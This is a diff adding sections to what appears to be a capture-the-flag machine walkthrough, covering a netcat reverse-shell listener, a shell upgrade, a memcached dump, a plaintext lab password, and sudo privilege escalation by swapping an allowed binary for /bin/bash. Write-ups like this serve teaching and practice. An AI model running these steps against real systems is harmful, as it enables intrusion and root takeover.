@@ -281,6 +281,92 @@ Password: soccer13
 
 
 
+## Initial Shell
+
+<figure><img src="../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvnp 1337
+```
+
+<figure><img src="../../.gitbook/assets/image (726).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (727).png" alt=""><figcaption></figcaption></figure>
+
+Get autocomplete
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+
+
+**Victim**
+
+```
+ss -ltp
+```
+
+<figure><img src="../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>
+
+## TCP/11211 - Memcache&#x20;
+
+**Victim**
+
+```
+cd /usr/share/memcached/scripts/  
+./memcached-tool localhost:1121 dump
+```
+
+<figure><img src="../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## Lateral Movement&#x20;
+
+I couldn't ssh into the host but could su from www-data
+
+**Victim**
+
+```
+su Orka
+Password: OrkAiSC00L24/7$
+```
+
+
+
+## Privilege Escalation&#x20;
+
+**Victim**
+
+```
+sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (730).png" alt=""><figcaption></figcaption></figure>
+
+I couldn't really do anything with the bitcoin application itself but I could move the folder desktop and then replace the bitcoin with bash
+
+**Victim**
+
+```
+cd /home/Orka
+mv Desktop/ bakup
+mkdir Desktop
+cp /bin/bash Desktop/bitcoin
+sudo /home/Orka/Desktop/bitcoin 
+```
+
+<figure><img src="../../.gitbook/assets/image (731).png" alt=""><figcaption></figcaption></figure>
+
 
 
 
